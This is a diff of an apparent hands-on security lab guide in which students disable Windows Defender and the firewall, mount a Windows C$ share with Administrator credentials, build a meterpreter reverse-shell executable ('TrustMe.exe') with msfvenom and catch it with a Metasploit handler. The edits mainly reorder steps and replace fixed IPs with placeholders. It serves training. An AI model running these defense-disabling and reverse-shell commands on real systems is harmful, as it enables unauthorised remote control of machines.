@@ -4,35 +4,19 @@ Let’s disable **Defender**. Simply run the following from an **Administrator P
 
 ![](attachments/OpeningPowershell.png)
 
+Next, run the following command in the **Powershell** terminal:
+
 <pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
 
+![](attachments/applocker_disabledefender.png)
 This will disable **Defender** for this session.
 
-If you get angry red errors, that is Ok, it means **Defender** is not running.
-
-Let’s start up the **ADHD Linux system** and set up our **malware** and **C2 listener**: 
-
-Let's get started by opening a **Kali** terminal
-
-![](attachments/OpeningKaliInstance.png)
-
-Alternatively, you can click on the **Kali** icon in the taskbar.
-
-![](attachments/TaskbarKaliIcon.png)
-
-Once the terminal opens, please run the following command:
-
-<pre>ifconfig</pre>
-
-![](attachments/ifconfig.png)
-
-Please note the IP address of **your** Ethernet adapter.  
-
-**Your IP Address and adapter name may be different.**
+If you get angry red errors, that is **Ok**, it means **Defender** is not running.
 
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
 <pre> netsh advfirewall set allprofiles state off</pre>
+
 
 Next, set a password for the Administrator account that you can remember
 
@@ -40,17 +24,29 @@ Next, set a password for the Administrator account that you can remember
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
-Within the Command Prompt, please run the following command:
+Before we move on from our Powershell window, lets get our IP by running the following command:
 
 <pre>ipconfig</pre>
 
-Please note your Windows IP address.
+![](attachments/powershellipconfig.png)
+**REMEMBER - YOUR IP WILL BE DIFFERENT**
+
+Write this IP down so we can use it again later.
+
+Let's continue by opening a **Kali** terminal
+
+![](attachments/OpeningKaliInstance.png)
+
+Alternatively, you can click on the **Kali** icon in the taskbar.
+
+![](attachments/TaskbarKaliIcon.png)
+
 
 We need to run the following commands in order to mount our remote system to the correct directory:
 
 <pre>sudo su -</pre>
 
-<pre>mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh</pre>
+<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh</pre>
 
 **REMEMBER - YOUR IP ADDRESS WILL LIKELY BE DIFFERENT.**
 
@@ -58,7 +54,7 @@ Run the following commands to start a simple backdoor and backdoor listener:
  
 <pre>sudo su -</pre>
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
 Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
 
@@ -78,9 +74,9 @@ We are going to run the following commands to correctly set the parameters:
 
 <pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-<pre>set LHOST 10.10.1.117</pre>
+<pre>set LHOST [Your IP Address]</pre>
 
-Remember, **your IP will be different!**
+Remember, **Your IP will be different!**
 
 <pre>exploit</pre>
 
